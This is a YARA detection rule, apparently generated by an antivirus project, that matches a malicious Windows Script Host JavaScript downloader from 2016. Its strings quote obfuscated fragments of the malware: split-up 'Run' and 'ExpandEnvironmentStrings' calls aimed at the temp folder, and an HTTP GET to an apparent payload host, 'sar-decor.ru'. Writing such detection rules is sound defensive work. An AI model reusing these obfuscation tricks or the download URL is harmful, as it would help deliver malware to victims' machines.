rule sig_20160428_baf4213604f88ca2a7aac8ffa14ca261 {
  meta:
    description = "datamaliciousorder - file 20160428_baf4213604f88ca2a7aac8ffa14ca261.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f6a349a0910edafee45f78a9b9d80ae439b4ca7401da6207d103de628d98dc24"

  strings:
    $s1  = "function FpgYkrVtkKhfTroMxzGwi(HnhUmiAzuQjwTphQieGrl){JfyFopBoiQdwWobXylQmp[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function FpgYkrVtkKhfTroMxzGwi(HnhUmiAzuQjwTphQieGrl){JfyFopBoiQdwWobXylQmp[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function BhzSldZnaMrvRuoLsaVsz() {return JfyFopBoiQdwWobXylQmp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "YuqWalEdyMljOquCurPka[KxhFtaYqmBidDwtGcuZyq](\"G\" + \"ET\", \"http://sar-decor.ru/x8skfa\", false);" fullword ascii
    $s5  = "var GyeTumAimSzdSbxKycWtc = this[\"WScript\"];" fullword ascii
    $s6  = "function BhzSldZnaMrvRuoLsaVsz() {return JfyFopBoiQdwWobXylQmp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s7  = "function RfiReuEsnVwvOvaUjgCco(KwhTnvNquMmwZxsHqiEsv, XshItsKidCdkCcaBjeAki){ZewVtcIqiGyvYluFdrMhz = ZewVtcIqiGyvYluFdrMhz * 1; " ascii
    $s8  = "var JfyFopBoiQdwWobXylQmp = function YbrGqrJvdFwwOcwYaiFqv() {return GyeTumAimSzdSbxKycWtc[TjtYmcOlsAoeBqmHfuCav](\"WScript\"+\"" ascii
    $s9  = "function MgpVdzVcuMqhXpzVkhSlq(){return RlzNruWqjRvsVxyCcqNka + \"\";};" fullword ascii
    $s10 = "return KwhTnvNquMmwZxsHqiEsv - XshItsKidCdkCcaBjeAki;};" fullword ascii
    $s11 = "if (YuqWalEdyMljOquCurPka[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "var JfyFopBoiQdwWobXylQmp = function YbrGqrJvdFwwOcwYaiFqv() {return GyeTumAimSzdSbxKycWtc[TjtYmcOlsAoeBqmHfuCav](\"WScript\"+\"" ascii
    $s13 = "var PjzCfoZnhDhmIwkFmbJsc = false;" fullword ascii
    $s14 = "function RfiReuEsnVwvOvaUjgCco(KwhTnvNquMmwZxsHqiEsv, XshItsKidCdkCcaBjeAki){ZewVtcIqiGyvYluFdrMhz = ZewVtcIqiGyvYluFdrMhz * 1; " ascii
    $s15 = "}while (KzrQxfTvwCulAscPzzHkd);" fullword ascii
    $s16 = "var TkkIvlBzzAajNzwZqnFlj = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "function CcdFeiKccWlgLeiHmfTxk()" fullword ascii
    $s18 = "UutQsrMdwOphSlzHstMhl = true; " fullword ascii
    $s19 = "return RfiReuEsnVwvOvaUjgCco(1 == 1 ? IriCvxImkSkgTwoQxpAqp : 0, 1 == 1 ? RrwVjeFgrOrdGtbMvhDxz : 0);" fullword ascii
    $s20 = "var UutQsrMdwOphSlzHstMhl = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}